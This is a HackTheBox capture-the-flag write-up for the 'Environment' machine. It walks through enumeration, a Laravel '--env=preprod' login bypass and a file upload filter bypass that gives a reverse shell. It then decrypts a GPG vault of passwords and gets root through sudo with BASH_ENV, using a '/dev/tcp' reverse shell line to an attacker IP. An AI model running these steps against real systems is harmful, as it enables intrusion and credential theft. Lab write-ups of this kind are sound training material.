# Environment - HackTheBox Writeup

## 1. External Enumeration

### TCP Scan

```bash
nmap -sV -sC -Pn -p- --min-rate=1000 -n -oN env_fullscan.txt 10.10.11.67
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://environment.htb
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
## 2. Web Enumeration

### Manual Enumeration
#### WhatWeb

```bash
whatweb environment.htb
```

```bash
http://environment.htb [200 OK] Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], HttpOnly[laravel_session], IP[10.10.11.67], Laravel, Script, Title[Save the Environment | environment.htb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], nginx[1.22.1]
```

#### Dirb (Folder Enumeration)

```bash
dirb http://environment.htb
```

Found directories:

```bash
/build/
/build/assets/
/storage/
/storage/files/
/vendor/
/login
/logout
/mailing
/up
/upload
/robots.txt
/favicon.ico
/index.php
```

#### FFUF (Subdomain Enumeration)

```bash
ffuf -u http://10.10.11.67/ -H "Host: FUZZ.environment.htb" -w /usr/share/seclists/Discovery/DNS/ains-top1million-110000.txt -fs 169
```

```
# No findings
```

---
### Automated Audit (Not Relevant for Exploitation)

Those scans reported minor issues like missing HttpOnly flags, inode leaks in robots.txt, and a client-side desync vulnerability.  
These findings were not used in the exploitation chain of this box, but I include them here as part of a complete enumeration methodology.

#### Nikto

```bash
nikto -h http://environment.htb -Tuning x -Display V -o env_nikto.txt
```

Main results:

```
+ GET /: Cookie XSRF-TOKEN created without the httponly flag
+ GET /: Uncommon header 'x-content-type-options' found, with contents: nosniff
+ GET /: Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
+ GET /robots.txt: Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x678300c0 0x18
+ GET /robots.txt: "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ -3092: GET /login/: /login/: This might be interesting...
```

#### Burp Crawler & Audit

- Vulnerabilities: **Client-side desync** via `/robots.txt`
    
- Description: POST smuggling, browser interprets the next request.
    
- Remediation: patch the server, close the connection properly or use HTTP/2.
    
- References: [HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)

---

## 3. Exploitation

### Login Page / CSRF

Testing the parameters in the login we discovered that the "remember" parameter makes the app expose its source code:

```
POST /login HTTP/1.1
Host: environment.htb
...
_token=g97unpa8CkocqX66zo4XDqkud8s80P898pqGFfaF&email=test%40c.com&password=test&remember=FUZZED
```


- All POST requests in Laravel require a **CSRF token** (`_token`)
    
- POST without token → 419 Page Expired
    
- Token regenerated on every failed request
    
- `remember` parameter can expose source code


### Bypass Login

We found that the `preprod` environment variable allows direct login.

With interception enabled, we can bypass login using the following request:

```http
POST /login?--env=preprod HTTP/1.1
Host: environment.htb
...
_token=g97unpa8CkocqX66zo4XDqkud8s80P898pqGFfaF&email=test%40c.com&password=test&remember=True
```

Accessed: `http://environment.htb/management/dashboard`


---

### File Upload (Reverse Shell)

- Endpoint: `/management/profile`

    
- Bypass image restrictions:

```
Estensione: rev.php.
Content-Type: image/gif
Magic bytes: GIF89a
```


Listener:

```bash
nc -nvlp 1234
```

---

### User Shell (hish)

```bash
cd /home/hish
ls -lah
```

```bash
total 36K
drwxr-xr-x 5 hish hish 4.0K Apr 11 00:51 .
drwxr-xr-x 3 root root 4.0K Jan 12  2025 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 hish hish 3.5K Jan 12  2025 .bashrc
drwxr-xr-x 4 hish hish 4.0K Aug 28 22:19 .gnupg
drwxr-xr-x 3 hish hish 4.0K Jan  6  2025 .local
-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
drwxr-xr-x 2 hish hish 4.0K Jan 12  2025 backup
-rw-r--r-- 1 root hish   33 Aug 28 15:11 user.txt
```

```bash
cat user.txt
```

```bash
# 64c2d3<REDACTE>>
```

Shell upgrade:

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Backup contains encrypted files:

```bash
/home/hish/backup/keyvault.gpg
```

```bash
file keyvault.gpg 
```

```bash
keyvault.gpg: PGP RSA encrypted session key - keyid: B755B0ED D6CFCFD3 RSA (Encrypt or Sign) 2048b .
```

---

### KeyVault Decryption

```bash
export HOME=/tmp
cp -r .gnupg/ /tmp
gpg --decrypt keyvault.gpg
```

Results:

```
gpg: WARNING: unsafe permissions on homedir '/tmp/.gnupg'
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

SSH login:

```bash
ssh hish@environment.htb
Password: marineSPm@ster!!
```

---

### Privilege Escalation

#### Sudo Permissions

```bash
sudo -l
```

```bash
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

```bash
cat /usr/bin/systeminfo
```


```bash
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
```

#### BASH_ENV Exploit

```bash
echo 'bash -i >& /dev/tcp/10.10.14.99/4444 0>&1' > /tmp/root.sh
chmod +x /tmp/root.sh
export BASH_ENV=/tmp/root.sh
sudo /usr/bin/systeminfo
```

Root shell:

```bash
cd /root
ls
cat root.txt
# 50c4fe<REDACTED>
```

---

## Conclusions

- The box is based on **Laravel + Nginx**, typical for modern PHP web applications, providing both MVC architecture and built-in routing/middleware.

- **User access**: direct login bypass via the `preprod` environment variable, highlighting improper environment separation and potential misconfigurations in pre-production settings.

- **File upload**: image upload functionality could be exploited to achieve a reverse shell, emphasizing the importance of proper file validation, MIME type checks, and server-side restrictions.

- **Privilege Escalation**: the `BASH_ENV` environment variable could be abused with a modifiable script, showing how environment variables and sudo permissions can lead to root access if not carefully managed.

- **KeyVault PGP**: decrypting the KeyVault revealed sensitive credentials, underlining the risk of storing secrets unprotected or with weak access control.